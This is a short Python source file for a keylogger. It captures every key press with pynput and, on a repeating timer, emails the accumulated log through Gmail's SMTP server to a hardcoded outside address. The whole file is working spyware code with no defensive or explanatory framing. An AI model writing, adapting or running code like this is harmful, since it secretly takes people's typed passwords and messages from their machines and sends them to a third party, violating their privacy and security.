import smtplib
import pynput.keyboard
import threading

log = ""


class Keylogger:
    def __init__(self, time_interval, email, password):
        self.log = "Started 💖"
        self.interval = time_interval
        self.email = email
        self.password = password
        print("Constructor method")

    def append_to_log(self, string):
        self.log = self.log + string

    def process_key_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            else:
                current_key = " " + str(key) + " "
        self.append_to_log(current_key)

    def report(self):
        self.send_mail(self.email, self.password, "\n\n" + self.log)
        self.log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def send_mail(self, email, password, message):
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(email, password)
        message = u' '.join(message).encode('utf-8')
        server.sendmail(email, "olgachorna@ukr.net", message)
        server.quit()

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()